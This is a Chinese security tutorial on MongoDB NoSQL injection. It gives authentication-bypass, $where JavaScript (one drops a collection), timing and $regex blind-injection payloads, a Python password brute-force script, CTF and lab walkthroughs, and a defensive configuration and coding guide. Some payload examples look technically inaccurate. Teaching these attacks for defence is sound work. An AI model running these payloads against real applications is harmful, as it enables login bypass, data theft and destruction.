---
title: MongoDB NoSQL 注入核心原理与实战指南
description: 系统梳理 MongoDB NoSQL 注入的核心原理、四大注入手法（联合查询、JavaScript注入、盲注、重言式/数组注入）、实战案例（GKCTF
  2021、墨者靶场）及防御配置指南
category: program-analysis
tags:
- MongoDB
- NoSQL注入
- Web安全
- CTF
- 数据库安全
- 盲注
- JavaScript注入
- 重言式注入
- 未授权访问
date: 2024-01-15
updated: '2026-11-14'
---

## 概述

NoSQL（Not Only SQL）泛指非关系型数据库，适用于超大规模数据存储，无需固定模式、支持横向扩展。MongoDB 作为最流行的文档型数据库，以 BSON（Binary JSON）格式存储数据，功能最丰富、最接近关系型数据库。

> **核心差异**：关系型数据库基于表、行、列；MongoDB 基于数据库、集合、文档、字段。文档无模式、键值对有序、类型敏感、键名区分大小写。

## 核心概念对照表

| SQL 概念 | MongoDB 概念 | 说明 |
|----------|--------------|------|
| database | database | 数据库 |
| table | collection | 集合/表 |
| row | document | 文档/记录 |
| column | field | 字段/域 |
| index | index | 索引 |

## MongoDB 内置数据库

| 数据库 | 用途 |
|--------|------|
| **admin** | 权限视角的 "root" 库，用户添加后自动继承所有库权限，特定服务端命令（如列出所有库、关闭服务）仅能在此运行 |
| **local** | 永不复制，存储本地单台服务器专用集合 |
| **config** | 分片集群模式下内部使用，保存分片元信息 |

## 关键配置与未授权访问风险

- **默认监听地址差异**：3.0 以前版本默认 `0.0.0.0`，3.0 及以后默认 `127.0.0.1`
- **未配置认证授权**时，无需认证即可任意操作数据库，存在严重数据泄露风险
- **配置文件**：Windows 为 `mongod.cfg`，Linux 为 `mongod.conf`

### 允许远程连接（测试用）
```yaml
# mongod.cfg / mongod.conf
net:
  bindIp: 0.0.0.0
```

## CRUD 操作速查

### 数据库/集合管理
```javascript
// 创建/切换数据库
use DATABASE_NAME

// 查看所有数据库
show dbs

// 删除当前数据库
db.dropDatabase()

// 显式创建集合
db.createCollection("mySet", { capped: true, size: 6142800, max: 10000 })

// 删除集合
db.mySet.drop()
```

### 文档插入
```javascript
// 单条插入（自动生成 _id）
db.users.insert({ username: "1jzz", password: "password" })

// 指定 _id 插入
db.users.insert({ _id: 100, username: "admin" })

// 批量插入
db.users.insert([
  { username: "user1" },
  { username: "user2" }
])

// MongoDB 3.2+ 新语法
db.collection.insertOne({ item: "card", qty: 15 })
db.collection.insertMany([{ item: "pen", qty: 20 }, { item: "pencil", qty: 30 }])
```

### 文档更新
```javascript
// update() - 修改第一条匹配文档
db.test.update(
  { item: "card" },
  { $set: { qty: 35 } }
)

// 修改所有匹配文档
db.test.update(
  { item: "card" },
  { $set: { qty: 35 } },
  { multi: true }
)

// upsert: 不存在则插入
db.test.update(
  { item: "new" },
  { $set: { qty: 10 } },
  { upsert: true }
)

// save() - 存在 _id 则替换，否则插入
db.products.save({ _id: 100, item: "book", price: 50 })
```

### 文档删除
```javascript
// 删除所有匹配文档
db.collection.remove({ status: "D" })

// 仅删除第一条匹配文档
db.collection.remove({ status: "D" }, { justOne: true })
```

### 查询与比较操作符
```javascript
// 基础查询
db.users.find({ username: "1jzz" })
db.users.findOne({ username: "1jzz" })

// 比较操作符
db.love.find({ age: { $lt: 19 } })      // 小于
db.love.find({ age: { $lte: 19 } })     // 小于等于
db.love.find({ age: { $gt: 19 } })      // 大于
db.love.find({ age: { $gte: 19 } })     // 大于等于
db.love.find({ age: { $ne: 19 } })      // 不等于

// 逻辑操作符
db.users.find({ $or: [{ username: "1jzz" }, { username: "1jzz4" }] })
db.users.find({ $and: [{ username: "1jzz" }, { password: "password" }] })

// 正则匹配（盲注核心）
db.users.find({ username: { $regex: "^adm" } })

// 分页
db.collection.find().limit(10).skip(20)
```

## NoSQL 注入攻击面分析

NoSQL 注入利用应用层未对用户输入进行严格类型/结构校验，将恶意查询操作符注入原本的查询结构，改变查询语义。与 SQL 注入类似，但操作符基于 JSON/BSON 结构。

> **注入流程**：用户输入 → 应用拼接查询对象 → MongoDB 解析执行 → 返回异常数据/执行任意代码

## 四大核心注入手法

### 联合查询注入
利用 `$or`、`$and` 等逻辑操作符改变查询返回集，常用于绕过认证获取数据。

```javascript
// 原查询：db.users.find({ username: "input", password: "input" })
// 注入 payload：username=admin&password[$or]=[{},{"a":"a"}]
// 实际执行：{ username: "admin", password: { $or: [ {}, { "a": "a" } ] } }
// 结果：password 条件永真，绕过验证
```

### JavaScript 注入（$where 操作符）

**$where 允许执行任意 JavaScript 表达式/函数**，是危害最大的注入向量。

#### MongoDB 2.4 之前（可访问全局对象 `db`）
```javascript
// 获取所有集合名
db.users.find({
  $where: "function() { var coll = db.getCollectionNames(); return true; }"
})

// 利用 map-reduce/group 执行任意代码
db.users.find({
  $where: "function() { db.collection.drop(); return true; }"
})
```

#### MongoDB 2.4 之后（`db` 对象受限，但仍可构造万能密码）
```javascript
// 基于时间盲注
db.users.find({
  username: "admin",
  $where: "function() { sleep(5000); return true; }"
})

// 万能密码绕过
// 传入：username=admin&password=' || '1'=='1
// 查询变为：{ username: "admin", password: { $where: "' || '1'=='1" } }
```

**检测 Payload**：
```
username=test&password='test',sleep(5000)
```
若服务端延迟 5 秒，确认注入存在。

### 盲注（基于 $regex 正则表达式）

无回显场景下，利用 `$regex` 逐字符爆破字段值，类似 SQL 中的 `substr()` 盲注。

#### 实战案例：[GKCTF 2021] hackme

**步骤 1**：永真式测试确认注入点
```json
{ "username": { "$ne": "" }, "password": { "$ne": "" } }
```
返回 "hacker" 提示存在注入。

**步骤 2**：Unicode 编码绕过过滤
```json
{ "username": { "\u0024ne": "" }, "password": { "\u0024ne": "" } }
```

**步骤 3**：$regex 逐位爆破密码
```python
# Python 爆破脚本示例
import requests
import string

url = "http://target/login"
charset = string.ascii_letters + string.digits + "!@#$%^&*()"
password = ""

for i in range(1, 50):
    for c in charset:
        payload = {
            "username": {"$regex": "^admin$"},
            "password": {"$regex": f"^{password}{c}"}
        }
        r = requests.post(url, json=payload)
        if "hacker" in r.text:
            password += c
            print(f"[+] Found: {password}")
            break
```

**特殊字符转义**：`^` (开头)、`.` (任意单字符)、`!` (取反) 等需转义或使用十六进制编码。

### 重言式/数组注入（PHP 特性利用）

PHP 允许通过 `param[key]=value` 将 GET 参数解析为关联数组，导致原本单值查询变为条件查询。

#### 攻击原理
```php
// 后端代码
$username = $_GET['username'];
$password = $_GET['password'];
$query = ['username' => $username, 'password' => $password];
$db->users->findOne($query);
```

#### 攻击 Payload
| Payload | 解析后结构 | 效果 |
|---------|------------|------|
| `username[$ne]=&password[$ne]=` | `username: {$ne: ""}, password: {$ne: ""}` | 绕过认证（不等于空串） |
| `username[$gt]=&password[$gt]=` | `username: {$gt: ""}, password: {$gt: ""}` | 绕过认证（大于空串） |
| `username[$regex]=^adm&password[$ne]=` | `username: {$regex: "^adm"}, password: {$ne: ""}` | 结合正则精准匹配 |

> **ODM/ORM 防御**：使用 Mongoose 等 ODM 框架时，Schema 定义会强制类型转换，自动过滤非预期操作符，但原生驱动或弱类型语言（PHP、Node.js 无 Schema 校验）极易受攻击。

## 实战案例复现

### 案例一：GKCTF 2021 hackme（盲注完整链路）

1. **识别注入点**：登录接口提示 "nosql"，尝试永真式 `{ "$ne": "" }` 返回 "hacker"
2. **绕过过滤**：关键字 `$ne` 被过滤，使用 Unicode `\u0024ne` 绕过
3. **盲注爆破**：利用 `$regex` 正则逐位匹配密码
4. **获取 Flag**：登录成功后获取 Flag

### 案例二：墨者靶场 - MongoDB 手工注入测试

**后端代码片段**：
```php
$id = $_GET['id'];
$query = "db.news.findOne({_id: ObjectId('$id')})";
$result = $mongodb->execute($query);
echo $result['title'] . $result['content'];
```

**注入利用链**：

| 步骤 | Payload | 说明 |
|------|---------|------|
| 1. 探测闭合 | `id=1'});return {title:'test',content:'test'};//` | 闭合 `findOne({_id: ObjectId('1')})` 并注入返回对象 |
| 2. 获取数据库版本 | `id=1'});return {title:db.version(),content:1};//` | 利用 `db.version()` |
| 3. 获取当前库名 | `id=1'});return {title:db.getName(),content:1};//` | |
| 4. 列出集合 | `id=1'});return {title:tojson(db.getCollectionNames()),content:1};//` | 数组需 `tojson()` 转字符串输出 |
| 5. 遍历文档 | `id=1'});var c=db.news.find();return {title:tojson(c[0]),content:1};//` | 指定下标 `c[0]`、`c[1]`... 逐条读取 |

> **关键技巧**：MongoDB Shell 中 `printjson()`/`tojson()` 将对象/数组转为可输出字符串；`ObjectId()` 需正确闭合。

## 防御配置指南

### 网络层访问控制
```yaml
# mongod.conf
net:
  bindIp: 127.0.0.1,10.0.0.1  # 仅绑定内网管理 IP，禁止 0.0.0.0
  port: 27017
```

### 启用基于角色的访问控制 (RBAC)

**步骤 1：创建管理员用户**
```javascript
use admin
db.createUser({
  user: "admin",
  pwd: "StrongP@ssw0rd",
  roles: [{ role: "userAdminAnyDatabase", db: "admin" }]
})
```

**步骤 2：创建业务用户（最小权限原则）**
```javascript
use php_test
db.createUser({
  user: "app_user",
  pwd: "AppP@ssw0rd",
  roles: [
    { role: "readWrite", db: "php_test" },
    { role: "read", db: "reporting" }
  ]
})
```

**步骤 3：开启认证**
```yaml
# mongod.conf
security:
  authorization: enabled
```

**步骤 4：重启服务并验证**
```bash
# Linux
systemctl restart mongod

# 连接测试
mongo -u app_user -p AppP@ssw0rd --authenticationDatabase php_test
```

### 应用层防御编码规范

| 语言/框架 | 防御措施 |
|-----------|----------|
| **Node.js (Mongoose)** | 定义 Schema，启用 `strict: true`，禁止动态字段；使用 `findOne({ username: req.body.username })` 而非直接传入 `req.body` |
| **PHP (MongoDB\Driver)** | 显式类型转换：`$filter = ['username' => (string)$_POST['username']]`；使用 `MongoDB\Model\BSONDocument` 构建查询 |
| **Python (PyMongo)** | 避免 `eval()`/`$where`；使用参数化查询 `collection.find({"username": username})` |
| **Java (Spring Data MongoDB)** | 使用 `@Query` 注解或 `Criteria` 对象构建查询，拒绝拼接 JSON 字符串 |
| **通用原则** | 1. 禁止 `$where`、`mapReduce`、`group` 等执行 JS 的操作符<br>2. 严格校验输入类型（字符串/数字/布尔/数组）<br>3. 实施白名单字段过滤，拒绝未知键名<br>4. 启用数据库审计日志，监控异常查询模式 |

### 审计与监控建议

- **开启慢查询日志**：`operationProfiling.mode: all`、`slowOpThresholdMs: 100`
- **关键操作告警**：监控 `$where`、`$regex` 高频调用、`admin` 库非预期访问
- **定期巡检**：`db.getUsers()` 检查冗余账号、`db.getRoles()` 复核权限最小化

## 交叉引用与延伸阅读

- [[mysql-dnslog-injection-loadfile-unc]] — MySQL 基于 DNSLog 的盲注数据外带技术，思路可迁移至 NoSQL 盲注出网场景
- [[mysql-duplicate-entry-error-based-sqli]] — MySQL 报错注入原理，对比 NoSQL 无报错回显特性差异
- [[java-preparedstatement-sql-injection-defense]] — Java 参数化查询防御模式，MongoDB Java 驱动同理需用 `Document`/`Criteria` 而非字符串拼接
- [[sqlmap-api-automation]] — SQLMap API 自动化扫描架构，可参考设计 NoSQL 注入自动化检测工具
- [[cybersecurity-interview-guide-2022]] — 面试题库中 NoSQL 注入考点汇总
- [[edu-src-penetration-test-case-study]] — 实战渗透中结合 NoSQL 注入的完整攻击链案例
- [[vulnhub-chronos-writeup]] — Node.js 原型链污染结合命令注入，展示 JS 运行时注入的另一攻击面
- [[huxiangbei-willphp-file-inclusion-writeup]] — PHP 框架变量覆盖导致文件包含，与数组注入成因相似（弱类型语言特性）

## 总结对比表

| 注入类型 | 核心操作符 | 适用版本 | 危害等级 | 典型场景 |
|----------|------------|----------|----------|----------|
| 联合查询 | `$or`, `$and`, `$nor` | 全版本 | 高 | 绕过登录、越权访问 |
| JavaScript 注入 | `$where`, `mapReduce`, `group` | 2.4 前可 RCE，2.4+ 仍可逻辑绕过 | 极高 | 延时盲注、万能密码、任意代码执行(旧版本) |
| 盲注 | `$regex`, `$options` | 全版本 | 高 | 无回显页面、WAF 拦截报错 |
| 重言式/数组注入 | `$ne`, `$gt`, `$gte`, `$exists`, `$type` | PHP/Node.js 弱类型解析 | 高 | 批量绕过认证、枚举字段结构 |

> **核心防御口诀**：禁用 JS 执行、强制类型校验、最小权限账号、网络层隔离、审计日志全覆盖。

## 来源

- [0x00实验室-202108-202304_048](../sources/0x00实验室-202108-202304_048.md)
